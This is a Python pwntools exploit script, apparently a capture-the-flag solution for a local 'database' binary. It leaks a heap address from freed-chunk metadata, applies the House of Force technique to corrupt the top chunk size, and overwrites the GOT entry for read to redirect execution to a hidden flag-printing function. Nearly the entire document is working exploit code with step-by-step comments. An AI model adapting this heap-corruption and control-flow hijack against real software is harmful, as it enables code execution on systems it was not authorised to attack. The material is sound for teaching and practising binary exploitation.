from pwn import *

# libc = ELF('./libc.so.6')
# r = process(['./ld-linux-x86-64.so.2', './database'], env={'LD_PRELOAD': './libc.so.6'})
r = process('./database')

context.log_level = 'debug'

main = 0x1275
secret = 0x1262
target = 0x201cf0

# insert string in database
def insert_data(length, info):
    r.recvuntil(b'=> ')
    r.send(b'2')
    r.recvuntil(b'=> ')
    r.send(str(length).encode('utf-8'))
    r.recvuntil(b'=> ')
    r.send(info)

# update string in database to given length and bytes
def update_data(index, length, info):
    r.recvuntil(b'=> ')
    r.send(b'3')
    r.recvuntil(b'=> ')
    r.send(str(index).encode('utf-8'))
    r.recvuntil(b'=> ')
    r.send(str(length).encode('utf-8'))
    r.recvuntil(b'=> ')
    r.send(info)

# remove string at perticular index
def remove_data(index):
    r.recvuntil(b'=> ')
    r.send(b'4')
    r.recvuntil(b'=> ')
    r.send(str(index).encode('utf-8'))


# get the base address of heap using metadata left by malloc
def get_addr():
    # insert 8 bytes
    insert_data(8, b'aaaabbbb')
    # insert 8 bytes
    insert_data(8, b'aaaabbbb')
    # insert 8 bytes
    insert_data(8, b'aaaabbbb')

    # delete index 2
    remove_data(2)
    # delete index 1
    remove_data(1)
    
    # now where index 1 was will have heap metadata 
    # which will be address of string at index 2

    # now read the meta data
    # update size of index 0 to 40
    # with same 8 byte data
    update_data(0, 40, b'aaaabbbb')

    # printing what we got
    # print_data
    r.recvuntil(b'=> ')
    r.send(b'1')
    r.recvline()
    data = r.recvuntil(b'=> ')
    r.send(b'1')

    offset = 5 + 32 # | 3 | {32 chars}{base_addr of 8 bytes}
    # print(data)
    addr = int.from_bytes(data[offset:offset + 8], 'little')
    
    # insert 8 bytes
    insert_data(8, b'aaaabbbb')
    # insert 8 bytes
    insert_data(8, b'aaaabbbb')
    return addr


# get the flag using house of force  
def get_flag(heap_addr, secret_addr, target_addr):

    # calculate amount of offset from 
    # current heap address and target heap address
    evil_size = target_addr - 8 * 6 - heap_addr
    # print(evil_size)
    
    # update value of top_header to 0xffff_ffff_ffff_ffff 
    # change length the last entry in database and 
    # override its value = "a" * 8 + "\x00" * 16 + "\xff" * 8
    update_data(2, 32, b'a'* 8 + b'\x00' * 16 + b'\xff' * 8)

    # insert evil size
    r.recvuntil(b'=> ')
    r.send(b'2')
    r.recvuntil(b'=> ')
    r.send(str(evil_size).encode('utf-8'))
    r.recvuntil(b'=> ')

    # now next pointer to be allocated will be at target_address
    # so we can override its value to whatever we want
    # overiting its value to secret function (which will give our flag)
    insert_data(8, p64(secret_addr))

    # make a call to `read` function to get the flag
    r.recvuntil(b'=> ')
    r.send(b'5')

    # receive the flag
    print(r.recv())


if __name__ == "__main__":
    
    # get the main address offset
    r.recvuntil(b'help: ')
    main_addr = int(r.recvuntil(b'\n').strip()[2:], 16)
    offset = main_addr - main 

    # address of secret function
    secret_addr = offset + secret
    
    # we override .got.plt address for read function 
    # to the address of secret so next time
    # we call read we get the flag 
    target_addr = offset + target
    
    # print(main_addr)
    # get the heap address
    heap_addr = get_addr()

    # print(hex(heap_addr))
    # print(hex(secret_addr))
    # print(hex(target_addr))
    
    # get the flag
    get_flag(heap_addr, secret_addr, target_addr)
